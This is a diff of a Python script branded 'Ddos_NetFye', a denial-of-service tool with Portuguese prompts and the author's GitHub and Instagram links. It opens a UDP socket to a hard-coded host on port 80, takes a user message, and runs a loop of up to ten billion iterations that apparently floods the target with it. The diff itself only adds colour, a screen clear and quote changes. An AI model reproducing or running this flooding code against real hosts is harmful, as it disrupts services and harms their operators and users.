@@ -2,20 +2,23 @@ import socket
 import time
 from colorama import init, Fore, Style
 import pyfiglet
+import os
 
 init()
 
-host = "192.168.1.39"
+host = '192.168.1.39'
 port = 80
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+os.system('cls')
 print("_____________________________________________________________________________________")
 text = "Ddos_NetFye"
 print(pyfiglet.figlet_format(text))
 print("_____________________________________________________________________________________")
-print("github: https://github.com/101Ruan")
-print("instagram: https://instagram.com/Darkzero4913\n")
+print(Fore.CYAN + "github: https://github.com/101Ruan" + Style.RESET_ALL)
+print(Fore.CYAN + "instagram: https://instagram.com/Darkzero4913\n" + Style.RESET_ALL)
+
 mensagem = input(Fore.BLUE + "digite uma mensagem: " + Style.RESET_ALL).encode()
 if not mensagem:
    print(Fore.RED + "mensagem vazia" + Style.RESET_ALL)
@@ -36,4 +39,3 @@ for i in range(1,10000000000):
     except Exception as e:
         print(f"erro {e}")
         break
-        
